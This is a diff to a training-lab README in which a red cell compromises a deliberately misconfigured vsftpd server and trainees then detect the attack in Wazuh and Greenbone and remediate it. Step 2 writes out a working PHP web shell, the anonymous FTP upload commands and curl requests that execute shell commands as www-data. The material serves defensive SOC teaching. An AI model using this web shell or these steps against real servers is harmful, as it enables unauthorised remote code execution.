@@ -29,8 +29,10 @@ of the lesson.
 
 ## Roles
 
-- **Red cell / instructor:** runs `enable-vulnerability.sh` on `target`, then
-  `attack.sh` on `kali`, without telling the trainee what was done.
+- **Red cell / instructor:** runs `enable-vulnerability.sh` on `target`
+  (this one setup step is scripted – it's building the lab, not attacking
+  it), then works through Step 2 below on `kali` by hand, without telling
+  the trainee what was done.
 - **Blue team / trainee:** only looks at Wazuh (and later Greenbone) to
   figure out what happened, then fixes it.
 
@@ -48,40 +50,90 @@ this setting tends to travel together with anonymous upload in real
 misconfigured servers) and a writable `/var/www/html/uploads` folder, then
 restarts `vsftpd`.
 
-## Step 2 – Red cell: run the attack
+## Step 2 – Red cell: attack it by hand
+
+Everything from here on is typed directly into a `kali` shell
+(`vagrant ssh kali`) – no wrapper script runs this for you.
+
+**2a. Write a small, clearly-labelled web shell:**
 
 ```bash
-vagrant ssh kali
-bash exercises/01-ftp-webshell/attack.sh
+cat > /tmp/shell.php <<'PHP'
+<?php
+// Mini-SOC training artifact (exercises/01-ftp-webshell) - NOT disguised,
+// NOT persistent beyond this exercise. Runs one shell command from ?c=.
+echo "<pre>Mini-SOC exercise 01 web shell\n";
+echo shell_exec($_GET['c'] ?? 'id');
+echo "</pre>";
+PHP
 ```
 
-What it actually does, against the real lab:
+One line of real functionality (`shell_exec` on whatever `?c=` says) –
+everything else is just making it obvious this is a training payload, not
+something to actually hide.
+
+**2b. Log in to the anonymous FTP and upload it** – an interactive FTP
+session, typed as you'd type it by hand:
+
+```bash
+ftp -inv 10.10.20.10 <<'FTP'
+user anonymous anonymous@example.com
+cd uploads
+binary
+put /tmp/shell.php shell.php
+bye
+FTP
+```
 
 ```
-[1/3] Anonymous FTP login + upload of minisoc_shell_11656.php into /uploads
 Connected to 10.10.20.10.
 220 (vsFTPd 3.0.5)
 331 Please specify the password.
 230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
 250 Directory successfully changed.
+200 Switching to Binary mode.
+local: /tmp/shell.php remote: shell.php
+229 Entering Extended Passive Mode (|||34450|)
+150 Ok to send data.
 226 Transfer complete.
+252 bytes sent in 00:00 (199.10 KiB/s)
+221 Goodbye.
+```
 
-[2/3] Triggering the web shell over HTTP (whoami)
+**2c. Trigger it over HTTP:**
+
+```bash
+curl -s 'http://10.10.20.10/uploads/shell.php?c=whoami'
+```
+
+```
 <pre>Mini-SOC exercise 01 web shell
 www-data
 </pre>
-[3/3] Proving real code execution (writing a marker file via the shell)
+```
+
+**2d. Prove it's real code execution, not just a static response** – write
+a file through the shell, then read it back with a second, independent
+request:
+
+```bash
+curl -s 'http://10.10.20.10/uploads/shell.php?c=echo+pwned+by+exercise-01+%3E+/tmp/exercise01_proof.txt' >/dev/null
+curl -s 'http://10.10.20.10/uploads/shell.php?c=cat+/tmp/exercise01_proof.txt'
+```
+
+```
 <pre>Mini-SOC exercise 01 web shell
 pwned by exercise-01
 </pre>
 ```
 
-Three real steps: anonymous FTP login, a PHP file landing inside the web
-root, and that file executing shell commands as `www-data` – full remote
-code execution, with nothing more than an FTP client and `curl`. The planted
-file is a small, clearly-labelled training payload (`shell.php`, a one-line
-`shell_exec($_GET['c'])`) – not disguised, not persistent beyond the
-exercise.
+Four real steps, four different pieces of the attacker's actual toolkit –
+a text editor, an FTP client, and `curl` – ending in full remote code
+execution as `www-data`. Nothing here is a single button; each step is
+something you ran yourself and read the output of before moving to the
+next.
 
 ## Step 3 – Blue team: find it in Wazuh
 
@@ -94,15 +146,15 @@ since no single one of them depends on the others:
 
 | # | Source | Rule | Level | What it tells you |
 |---|---|---|---|---|
-| 1 | File-integrity monitoring (`/var/www/html`, realtime) | `554` (`syscheck_entry_added`) | 7 | A new file, `/var/www/html/uploads/minisoc_shell_11656.php`, appeared – owned by `ftp:ftp`, mode `rw-r--r--`. The *ownership* is the giveaway: nothing on this box should be creating files as the `ftp` user. |
+| 1 | File-integrity monitoring (`/var/www/html`, realtime) | `554` (`syscheck_entry_added`) | 5 | A new file, `/var/www/html/uploads/shell.php`, appeared – owned by `ftp:ftp`, mode `rw-r--r--`. The *ownership* is the giveaway: nothing on this box should be creating files as the `ftp` user. |
 | 2 | `vsftpd` log | `100120` – *"FTP: anonymous login succeeded"* (custom rule, chained onto Wazuh's built-in `11402`) | 10 | An anonymous FTP session from `10.10.66.10` (the Kali box) logged in successfully. |
 | 3 | `vsftpd` log | `100121` – *"FTP: a PHP file was uploaded via anonymous FTP – possible web shell!"* (custom rule, chained onto Wazuh's built-in `11404`) | 12 | The anonymous session that just logged in uploaded a `.php` file. |
 
 Rules 2 and 3 are both level ≥ 10, so both are forwarded automatically to
 **DFIR-IRIS** (`https://localhost:8445`) as new alerts with `10.10.66.10` as
 the indicator of compromise and `target` as the affected asset – in this
-real run they landed as IRIS alerts #817 and #818. Escalate them into a case
-there to document the investigation.
+real run they landed as IRIS alerts #5876 and #5877. Escalate them into a
+case there to document the investigation.
 
 At this point a trainee who has only seen these three alerts (not this
 document) should already be able to answer: *what* happened (a file was
@@ -134,7 +186,7 @@ Two findings on `target` directly confirm what Wazuh already pointed to:
 | **FTP Writeable Directories** | **Critical (10.0)** | 21/tcp | Names the exact path: `/uploads`. |
 
 That's the confirmation step: it isn't just that *something* used FTP, it's
-an independent tool – not Wazuh, not the attack script – actively probing
+an independent tool – not Wazuh, not the attacker – actively probing
 the service and reaching the same conclusion: anonymous login works, and a
 folder inside the web root is writable through it. Two unrelated detection
 methods (log-based alerting and an active vulnerability scan) agreeing on
@@ -163,8 +215,7 @@ step backed by a real tool, not a step that was merely assumed to work.
 
 | File | Runs on | Purpose |
 |---|---|---|
-| `enable-vulnerability.sh` | `target` | Turns the misconfiguration on (idempotent, reversible). |
-| `attack.sh` | `kali` | The attacker side: FTP upload + HTTP trigger. |
+| `enable-vulnerability.sh` | `target` | Turns the misconfiguration on (idempotent, reversible). This is environment setup, so it's scripted – the attack in Step 2 deliberately isn't. |
 | `fix.sh` | `target` | Remediation: removes the shell, restores the locked-down config. |
 
 ## Why this design (and what it deliberately isn't)
@@ -175,4 +226,7 @@ fully patched Ubuntu package, only its *configuration* is weakened, and only
 on demand. That is both safer (no legacy/unmaintained code with its own
 unrelated bugs running on the box) and more realistic: misconfiguration,
 not unpatched code, is the far more common real-world root cause of exactly
-this kind of incident.
+this kind of incident. The attack side is deliberately not a single script
+either: `enable-vulnerability.sh` and `fix.sh` set up and tear down the lab
+environment (not the attacker's job in a real engagement), but Step 2 is
+run by hand, tool by tool, exactly as typed above.
